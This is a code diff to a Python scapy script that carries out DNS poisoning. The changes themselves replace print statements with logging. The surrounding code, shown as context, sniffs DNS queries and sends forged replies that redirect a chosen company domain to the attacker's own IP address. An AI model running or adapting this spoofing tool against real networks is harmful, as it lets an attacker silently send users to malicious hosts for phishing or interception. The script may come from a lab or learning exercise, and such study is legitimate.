@@ -16,6 +16,8 @@ This script holds the code to perform DNS Poisoning.
 	> Once user enter a URL that is stated in MALICIOUS_IP, he/she will be redirected to MALICIOUS_IP
 """
 
+import logging
+
 from scapy.all import *
 
 IFACE = conf.iface
@@ -30,6 +32,14 @@ DNS_SERVER = "8.8.8.8"
 # Attacker Flags
 MALICIOUS_SITE = b"secret.companyxyz.com."
 MALICIOUS_IP = MY_IP
+
+# Logging Configuration
+LOG_FILE_DIR = os.path.abspath("logs/")
+logging.basicConfig(filename=LOG_FILE_DIR+"dns_poison.txt",
+					filemode='wb',
+					level=logging.DEBUG,
+					format='%(asctime)s %(message)s', 
+					datefmt='%d/%m/%Y %I:%M:%S %p')
 
 
 def dns_pkt_filter(pkt):
@@ -62,7 +72,7 @@ def dns_reply(pkt):
 		# User tries to access the site we want to spoof
 		else:
 			domain_ip = MALICIOUS_IP
-			print(f"[*] Redirecting {pkt[IP].src} to {MALICIOUS_IP}")
+			logging.info(f"[*] Redirecting {pkt[IP].src} to {MALICIOUS_IP}")
 
 		# Craft the Spoofed DNS Packet and send to requested Client
 		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
@@ -74,7 +84,7 @@ def dns_reply(pkt):
 							ancount=1)
 
 		send(spoofed_pkt, verbose=0)
-		print(f"[*] Resolve {qname} for Client: {pkt[IP].src}")
+		logging.info(f"[*] Resolve {qname} for Client: {pkt[IP].src}")
 
 	# Ignore all other traffic errors
 	except:
@@ -83,7 +93,7 @@ def dns_reply(pkt):
 
 def main():
 	""" Main Sniffer Function """
-	print("[*] Starting DNS Posioning ...")
+	logging.info("[*] Starting DNS Posioning ...")
 	sniff(lfilter=dns_pkt_filter, prn=dns_reply, iface=IFACE)
 
 
